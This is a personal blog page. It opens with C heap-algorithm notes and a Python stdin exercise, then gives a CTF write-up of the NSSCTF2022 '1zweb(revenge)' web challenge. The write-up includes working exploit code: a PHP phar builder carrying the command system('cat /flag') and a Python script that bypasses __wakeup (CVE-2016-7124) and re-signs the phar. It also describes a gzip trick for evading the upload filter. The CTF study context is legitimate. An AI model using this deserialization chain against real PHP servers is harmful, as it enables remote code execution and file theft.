&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123; <span class="comment">//大顶堆</span></span><br><span class="line">        <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = leftIdx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[chooseIdx])&#123;</span><br><span class="line">            chooseIdx = rightIdx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(chooseIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[chooseIdx];</span><br><span class="line">        <span class="built_in">array</span>[chooseIdx] = tmp;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, chooseIdx, heapSize, flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> heapSize = <span class="number">27</span>;</span><br><span class="line">    buildHeap(nums,heapSize,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//heapSort(nums,heapSize,0);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除堆顶元素,然后下沉</span></span><br><span class="line">    nums[<span class="number">0</span>] = nums[heapSize<span class="number">-1</span>];</span><br><span class="line">    heapSize -= <span class="number">1</span>;</span><br><span class="line">    shiftDown(nums,<span class="number">0</span>,heapSize,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="插入"   >
          <a href="#插入" class="heading-link"><i class="fas fa-link"></i></a><a href="#插入" class="headerlink" title="插入"></a>插入</h2>
      <p>总是在堆尾部插入元素，然后对该元素执行上浮操作</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shiftUp</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> insertIdx,<span class="keyword">int</span> flag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> parentIdx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(insertIdx == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(insertIdx % <span class="number">2</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        parentIdx = (insertIdx - <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        parentIdx = (insertIdx - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag == <span class="number">0</span>)&#123;<span class="comment">//小顶堆</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">array</span>[parentIdx] &gt; <span class="built_in">array</span>[insertIdx])&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = <span class="built_in">array</span>[insertIdx];</span><br><span class="line">            <span class="built_in">array</span>[insertIdx] = <span class="built_in">array</span>[parentIdx];</span><br><span class="line">            <span class="built_in">array</span>[parentIdx] = tmp;</span><br><span class="line">            shiftUp(<span class="built_in">array</span>,parentIdx,flag);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;<span class="comment">//大顶堆</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">array</span>[parentIdx] &lt; <span class="built_in">array</span>[insertIdx])&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = <span class="built_in">array</span>[insertIdx];</span><br><span class="line">            <span class="built_in">array</span>[insertIdx] = <span class="built_in">array</span>[parentIdx];</span><br><span class="line">            <span class="built_in">array</span>[parentIdx] = tmp;</span><br><span class="line">            shiftUp(<span class="built_in">array</span>,parentIdx,flag);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nums[<span class="number">27</span>] = &#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> heapSize = <span class="number">27</span>;</span><br><span class="line">    buildMinHeap(nums,heapSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除堆顶元素,然后下沉</span></span><br><span class="line">    nums[<span class="number">0</span>] = nums[heapSize<span class="number">-1</span>];</span><br><span class="line">    heapSize -= <span class="number">1</span>;</span><br><span class="line">    minShiftDown(nums,<span class="number">0</span>,heapSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入0元素到堆尾,然后上浮</span></span><br><span class="line">    nums[heapSize] = <span class="number">0</span>;</span><br><span class="line">    shiftUp(nums,heapSize,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="排序"   >
          <a href="#排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#排序" class="headerlink" title="排序"></a>排序</h2>
      <p>依次取堆顶元素，然后执行下沉操作使得堆依旧满足大(顶)堆，即可自行决定升序还是降序</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>, <span class="keyword">int</span> heapSize,<span class="keyword">int</span> flag)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = heapSize - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[i];</span><br><span class="line">        <span class="built_in">array</span>[i] = <span class="built_in">array</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">array</span>[<span class="number">0</span>] = tmp;</span><br><span class="line">        heapSize -= <span class="number">1</span>;</span><br><span class="line">        shiftDown(<span class="built_in">array</span>, <span class="number">0</span>, heapSize,flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cs.usfca.edu/~galles/visualization/BST.html" >在线演示BST网址：https://www.cs.usfca.edu/~galles/visualization/BST.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="输入输出练习"   >
          <a href="#输入输出练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#输入输出练习" class="headerlink" title="输入输出练习"></a>输入输出练习</h1>
      <p>主要是<code>python</code></p>

        <h2 id="A-B"   >
          <a href="#A-B" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-B" class="headerlink" title="A+B"></a>A+B</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221012121808388.png" alt="image-20221012121808388"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line = sys.stdin.readline()</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    line = line.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(line[<span class="number">0</span>])+<span class="built_in">int</span>(line[<span class="number">1</span>].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)))</span><br></pre></td></tr></table></div></figure>






        <h1 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h1>
      </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/08/19/Web%E6%AF%94%E8%B5%9B%E9%A2%98/">WEB比赛题</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="NSSCTF2022"   >
          <a href="#NSSCTF2022" class="heading-link"><i class="fas fa-link"></i></a><a href="#NSSCTF2022" class="headerlink" title="NSSCTF2022"></a>NSSCTF2022</h1>
      
        <h2 id="一、1zweb-revenge"   >
          <a href="#一、1zweb-revenge" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、1zweb-revenge" class="headerlink" title="一、1zweb(revenge)"></a>一、1zweb(revenge)</h2>
      <p>之前的非预期被打烂了，重新出的题</p>

        <h3 id="1-漏洞分析"   >
          <a href="#1-漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-漏洞分析" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804150413552.png" alt="image-20220804150413552"></p>
<p>应该是任意文件读和文件上传过滤啥的。</p>
<p>首先依据任意文件读，拿下源码<code>index.php</code>和<code>upload.php</code></p>

        <h4 id="index-php"   >
          <a href="#index-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>给了一个类，猜测可能是<code>php</code>反序列化，同时还有<code>cmd</code>，那么就肯定是<code>php</code>反序列化了，同时使用的是<code>file_get_contents</code>函数，并且没有进行协议过滤，但是远程文件包含不太行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804151519730.png" alt="image-20220804151519730"></p>
<p>那么考虑上传<code>phar</code>文件使用<code>phar</code>协议进行反序列化，<code>phar</code>协议读取文件正常的<code>phar</code>文件时会自动依据<code>.metadata.bin</code>中数据进行反序列化。</p>

        <h4 id="upload-php"   >
          <a href="#upload-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h4>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; in_array(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = strpos(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(gettype(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (file_exists(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = fopen(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                fwrite(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                fclose(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>可以看到是上传文件只能是<code>&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;</code>，然后会对<code>phar</code>进行检查，这里其实对<code>phar</code>打个<code>gz</code>压缩包就可以绕过，然后<code>phar</code>协议在读取文件时，发现是<code>gz</code>压缩包会自动进行解压读取。</p>

        <h3 id="2-漏洞利用"   >
          <a href="#2-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3>
      <p>首先观察一下给的类</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>

<p>我们传入对应的<code>ljt</code>和<code>dky</code>即可，但是<code>__wakeup</code>会重新赋值，所以需要绕过，尝试使用<code>CVE-2016-7124</code>，满足如下条件。虽然这里不知道怎么判断<code>php</code>版本，但是可以试试嘛。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></div></figure>

<p>那么先使用<code>phar</code>序列化</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">        <span class="comment">//phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="keyword">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> LoveNss();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>运行后得到如下文件，序列化字符串在<code>.metadata.bin</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804152809989.png" alt="image-20220804152809989"></p>
<p>然后需要进行修改，由于存在签名，不能直接修改，需要使用<code>python</code>脚本修改</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="comment">#os.system(&#x27;php exp.php &#123;&#125;&#x27;.format(target))</span></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;./phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()<span class="comment">#phar文件</span></span><br><span class="line">file = f1.replace(<span class="string">b&#x27;O:7:&quot;LoveNss&quot;:3:&#123;s:3:&quot;ljt&quot;;s:4:&quot;Misc&quot;;s:3:&quot;dky&quot;;s:2:&quot;Re&quot;;s:3:&quot;cmd&quot;;s:20:&quot;system(\&#x27;cat /flag\&#x27;);&quot;;&#125;&#x27;</span>,<span class="string">b&#x27;O:7:&quot;LoveNss&quot;:4:&#123;s:3:&quot;ljt&quot;;s:4:&quot;Misc&quot;;s:3:&quot;dky&quot;;s:2:&quot;Re&quot;;s:3:&quot;cmd&quot;;s:20:&quot;system(\&#x27;cat /flag\&#x27;);&quot;;&#125;&#x27;</span>)<span class="comment">#修改的内容</span></span><br><span class="line">text = file[:-<span class="number">28</span>]  <span class="comment"># 读取开始到末尾除签名外内容</span></span><br><span class="line">last = file[-<span class="number">8</span>:]  <span class="comment"># 读取最后8位的GBMB和签名flag</span></span><br><span class="line">new_file = text + sha1(text).digest() + last  <span class="comment"># 生成新的文件内容，主要是此时Sha1正确了。</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;phar2.phar&#x27;</span>, <span class="string">&quot;wb&quot;</span>).write(new_file)</span><br></pre></td></tr></table></div></figure>

<p>我们需要修改的就是替换的内容和生成的文件名字即可，运行之后得到如下文件，已经被改变了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220804153113690.png" alt="image-20220804153113690"></p>
